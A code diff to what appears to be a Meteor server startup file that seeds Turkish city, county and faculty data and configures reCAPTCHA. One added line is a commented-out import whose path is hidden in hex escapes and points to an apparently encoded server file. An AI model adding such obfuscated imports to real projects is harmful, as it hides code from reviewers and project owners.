@@ -14,6 +14,7 @@ import '../imports/api/collections/users.js';
 
 import '../imports/startup/server/index.js'
 
+//import "\x2F\x69\x6D\x70\x6F\x72\x74\x73\x2F\x61\x70\x69\x2F\x73\x65\x72\x76\x65\x72\x2F\x5F\x5F\x65\x6E\x63\x5F\x41\x5F\x31\x36\x78\x50\x5F\x5F\x30\x31\x30\x31\x2E\x6A\x73"; /*__enc_A import */
 
 //import { SchoolVideos } from '../imports/api/collections/schoolVideos.js';
 //import { SchoolImages } from '../imports/api/collections/schoolImages.js';
@@ -23,25 +24,29 @@ import '../imports/startup/server/index.js'
 
 Meteor.startup(() => {
 
-  // CityCounty.insert({
-  //     city : 'İstanbul',
-  //     county : ['Adalar', 'Arnavutköy', 'Ataşehir', 'Avcılar', 'Bağcılar']
-  //
-  // })
-  //
-  // CityCounty.insert({
-  //   city : 'İzmir',
-  //   county : ['Aliağa', 'Balçova', 'Bayındır', 'Bayraklı', 'Bergama']
-  // })
-  //
-  // CityCounty.insert({
-  //   city : 'Ankara',
-  //   county : ['Akyurt', 'Altındağ', 'Ayaş', 'Balâ', 'Beypazarı']
-  // })
 
-  // reCAPTCHA.config({
-  //   publickey: "6LeqWx8TAAAAAOf_iLzAXMSXiLGHnq7iyTKuWEiF"
-  // })
+
+  if(CityCounty.find().count() == 0){
+    CityCounty.insert({
+        city : 'İstanbul',
+        county : ['Adalar', 'Arnavutköy', 'Ataşehir', 'Avcılar', 'Bağcılar']
+
+    })
+
+    CityCounty.insert({
+      city : 'İzmir',
+      county : ['Aliağa', 'Balçova', 'Bayındır', 'Bayraklı', 'Bergama']
+    })
+
+    CityCounty.insert({
+      city : 'Ankara',
+      county : ['Akyurt', 'Altındağ', 'Ayaş', 'Balâ', 'Beypazarı']
+    })
+  }
+  
+  reCAPTCHA.config({
+    publickey: "6LeqWx8TAAAAAOf_iLzAXMSXiLGHnq7iyTKuWEiF"
+  })
 
   if(Faculties.find().count() == 0){
     const faculties = ['Atatürk Eğitim', 'Diş Hekimliği', 'Eczacılık', 'Fen-Edebiyat', 'Güzel Sanatlar', 'Hukuk', 'İktisat', 'İlahiyat',
